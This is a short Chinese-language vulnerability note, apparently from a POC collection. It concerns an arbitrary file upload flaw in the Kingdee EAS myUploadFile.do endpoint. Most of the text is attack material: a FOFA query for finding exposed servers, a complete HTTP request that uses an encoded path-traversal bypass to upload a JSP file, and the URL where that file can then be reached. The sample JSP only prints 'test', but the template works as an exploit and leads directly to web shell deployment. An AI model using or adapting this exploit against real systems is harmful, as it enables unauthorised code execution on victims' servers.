
## 金蝶EAS myUploadFile任意文件上传
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Lc4ILVKo1g9cSbQc2icEW80fDeYIQ78YeAVSBibGsibyzialJJWOTNHIVt7dpyC4CDibfPeaI3Apn7jn4zHwhPpsWfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## fofa
```
app="Kingdee-EAS"
```

## POC
```
POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
Content-Length: 205

------WebKitFormBoundarySq4lDnabv8CwHfvx
Content-Disposition: form-data; name="myFile"; filename="test.jsp"
Content-Type: text/html

<%out.println("test");%>
------WebKitFormBoundarySq4lDnabv8CwHfvx--
```

jsp路径：

http://127.0.0.1/easportal/buffalo/../test.jsp
